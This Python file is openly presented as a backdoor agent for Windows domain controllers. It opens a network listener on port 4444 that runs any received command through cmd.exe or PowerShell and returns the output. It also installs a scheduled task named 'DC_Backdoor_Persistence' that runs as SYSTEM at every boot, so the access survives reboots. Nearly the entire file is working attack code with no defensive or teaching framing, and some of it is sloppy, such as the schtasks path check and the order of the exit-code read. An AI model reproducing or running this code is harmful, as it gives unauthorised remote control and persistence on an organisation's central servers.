#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Windows Domain Controller Persistence & Reverse Shell Agent.
All-in-One Python Script:
 1. Establishes a reverse TCP listener (Port 4444 default).
 2. Pipes input to cmd.exe or PowerShell.
 3. Pumps output back to the client.
 4. Installs Windows Task Scheduler persistence (ONSTART) to survive reboot.

"""

import socket
import threading
import sys
import os
import argparse
import time
import datetime
import subprocess
from subprocess import Popen, PIPE
import signal

# === CONFIGURATION ===
LISTENER_HOST = "0.0.0.0"
DEFAULT_PORT = 4444
DEFAULT_TASK_NAME = "DC_Backdoor_Persistence"
DEFAULT_TASK_RUN_AS = "SYSTEM"
DEFAULT_TASK_TRIGGER = "ONSTART"
DEFAULT_SCRIPT_PATH = ""  # Auto-detected

# === LIFECYCLE MANAGER ===
class LifecycleManager:
    """
    Manages the process lifecycle to keep listener alive after shell closure.
    Uses daemon threads and signal handlers for graceful recovery.
    """
    def __init__(self):
        self.daemon = True
        self.running = True
        self.main_thread = threading.Thread(target=self._keep_alive)
        self.main_thread.daemon = True
        
    def keep_alive(self):
        """Main loop to keep the process alive even after subprocess ends."""
        print("[*] Lifecycle Manager: Main thread entered (will run until exit)")
        try:
            while self.running:
                time.sleep(1)  # Sleep 1 second to reduce CPU usage
        except KeyboardInterrupt:
            print("[*] Lifecycle Manager: Received Ctrl+C")
            self.running = False
        finally:
            print("[*] Lifecycle Manager: Exiting main loop")
        
    def _keep_alive(self):
        """Background thread to keep process alive."""
        self.keep_alive()
        
    def on_exit(self):
        """Cleanup before exit."""
        self.running = False

# === SOCKET HANDLER (Multi-Threaded, Persistent) ===
class SocketHandler:
    def __init__(self, host, port, command_type):
        self.host = host
        self.port = port
        self.command_type = command_type
        self.socket = None
        self.thread = None
        
    def start(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.host, self.port))
        self.socket.listen(5)
        print(f"[+] Listener Started on {self.host}:{self.port}")
        print(f"[+] Mode: {self.command_type}")
        print(f"[+] Waiting for connection...")
        
        # Main Loop for the Listener
        while True:
            try:
                client_sock, addr = self.socket.accept()
                print(f"[*] Connected: {addr}")
                # Start a new thread for every client connection
                threading.Thread(target=self.process_connection, args=(client_sock, addr)).start()
            except Exception as e:
                print(f"Error accepting connection: {e}")
                time.sleep(1)
                continue

    def process_connection(self, client_sock, addr):
        try:
            while True:
                msg = client_sock.recv(4096).decode('utf-8').strip()
                if not msg:
                    break
                clean_cmd = msg.strip('"\'')
                output = self.execute_shell(clean_cmd)
                client_sock.sendall(output.encode('utf-8'))
        except Exception as e:
            print(f"[!] Error reading from {addr}: {e}")
        finally:
            try:
                client_sock.close()
            except:
                pass

    def execute_shell(self, cmd):
        if not cmd:
            return "Prompt is ready."
        executable = "powershell.exe" if self.command_type == "powershell" else "cmd.exe"
        shell_cmd = executable + " /c " + cmd
        try:
            proc = Popen(shell_cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True)
            output = ""
            try:
                if proc.stdout:
                    output = proc.stdout.read()
                if proc.stderr:
                    err = proc.stderr.read()
                    if err:
                        output = output + "\n[Error]: " + err
            except:
                pass
            exit_code = proc.returncode
            proc.wait()
            return f"exit_code:{exit_code}\n{output}"
        except Exception as e:
            return f"Exception: {e}"

# === PERSISTENCE MANAGER ===
class PersistenceManager:
    @staticmethod
    def create_task(script_path, task_name, run_as="SYSTEM", trigger="ONSTART"):
        print(f"[*] Configuring Persistence via Task Scheduler...")
        schtasks_exe = "schtasks"
        if not os.path.exists(schtasks_exe):
            print("[!] Warning: schtasks.exe not found in default path")
            return
        escaped_path = script_path.replace('\\', '\\\\')
        command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {escaped_path}" /RU "{run_as}" /SC {trigger} /ST 00:00 /F'
        try:
            print(f"[*] Running Command: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Task Created/Updated: {task_name}")
                print(f"[+] Running As: {run_as}")
                print(f"[+] Trigger: {trigger}")
            else:
                print(f"[!] Error creating task. Output: {result.stderr}")
        except Exception as e:
            print(f"[!] Exception while creating task: {e}")

# === MAIN ENTRY POINT ===
def get_script_path():
    return os.path.abspath(sys.argv[0])

def main():
    parser = argparse.ArgumentParser(description="DC Reverse Shell Persistence Agent (Survival Mode)")
    parser.add_argument('--mode', type=str, default='cmd', choices=['cmd', 'powershell'], help='Shell mode (Default: cmd)')
    parser.add_argument('--port', type=int, default=DEFAULT_PORT, help='Listening port (Default: 4444)')
    parser.add_argument('--install', action='store_true', help='Force install persistence (Default: True)')
    args = parser.parse_args()
    
    print("="*30)
    print("WINDOWS REVERSE SHELL AGENT")
    print("="*30)
    
    script_path = get_script_path()
    print(f"[*] Script Executing From: {script_path}")
    
    # === 1. Setup Socket Listener ===
    listener = SocketHandler(LISTENER_HOST, args.port, args.mode)
    
    # === 2. Setup Persistence (Create Task) ===
    if args.install:
        import subprocess
        create_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        PersistenceManager.create_task(script_path, DEFAULT_TASK_NAME, DEFAULT_TASK_RUN_AS, DEFAULT_TASK_TRIGGER)
        time.sleep(2)
    
    # === 3. Start Listener Thread (Daemonized) ===
    listener_thread = threading.Thread(target=listener.start)
    listener_thread.daemon = True
    listener_thread.start()
    
    print("[+] Agent Initialized.")
    print("[+] Main thread will keep running to monitor exit codes.")
    
    # === 4. Lifecycle Manager ===
    lifecycle = LifecycleManager()
    lifecycle.main_thread.start()
    
    print("[*] Lifecycle Manager thread started")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Graceful Shutdown...")
        lifecycle.main_thread.join()
        listener.socket.close()
    except Exception as e:
        print(f"[!] Fatal Error: {e}")
        lifecycle.main_thread.join()
        listener.socket.close()

if __name__ == "__main__":
    main()